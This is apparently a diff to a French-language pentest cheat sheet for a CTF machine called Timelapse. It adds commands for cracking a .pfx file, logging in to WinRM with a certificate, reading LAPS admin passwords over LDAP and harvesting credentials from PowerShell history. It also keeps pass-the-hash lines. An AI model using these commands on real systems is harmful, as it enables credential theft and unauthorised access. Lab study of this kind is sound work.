@@ -209,6 +209,34 @@ evil-winrm -i <IP> -u Administrator -H <NThash>
 export KRB5CCNAME=ticket.ccache
 impacket-wmiexec -k -no-pass <DC>
 impacket-psexec  -k -no-pass <DC>
+
+# WinRM par CERTIFICAT (.pfx cracké → cert + clé) — Timelapse
+pfx2john bundle.pfx > h.txt ; john --wordlist=rockyou.txt h.txt      # casser le pfx
+openssl pkcs12 -in bundle.pfx -clcerts -nokeys -out cert.crt         # certif public
+openssl pkcs12 -in bundle.pfx -nocerts  -nodes  -out key.key         # clé privée
+evil-winrm -i <IP> -c cert.crt -k key.key -S                         # -S = WinRM-SSL (5986)
+```
+
+> ⚠️ **evil-winrm figé sur « Establishing connection »** = mauvais port. Si `nxc winrm` montre **`WINRM-SSL ... 5986`**, seul le HTTPS est ouvert → ajouter **`-S`** (defaut = 5985 HTTP).
+
+### LAPS (mdp admin local en clair dans l'AD) — Timelapse
+
+Si ton compte est dans **LAPS_Readers**, lis l'attribut **`ms-Mcs-AdmPwd`** de l'objet ordinateur — en LDAP, sans shell :
+```bash
+nxc ldap <IP> -u <user> -p '<pass>' --module laps          # (ou -M laps / --laps selon version)
+ldapsearch -x -H ldap://<DOM> -D '<user>@<DOM>' -w '<pass>' -b 'DC=dom,DC=htb' '(sAMAccountName=DC01$)' ms-Mcs-AdmPwd
+# -> mdp de l'Administrateur LOCAL -> evil-winrm -i <IP> -u administrator -p '<laps>' -S
+```
+> LAPS **tourne** périodiquement → lire le mdp et l'utiliser tout de suite.
+
+### Historique PowerShell (creds planqués)
+```powershell
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
+
+### Flag introuvable (on est admin)
+```powershell
+Get-ChildItem C:\Users -Recurse -Filter root.txt -ErrorAction SilentlyContinue | select FullName
 ```
 
 ---
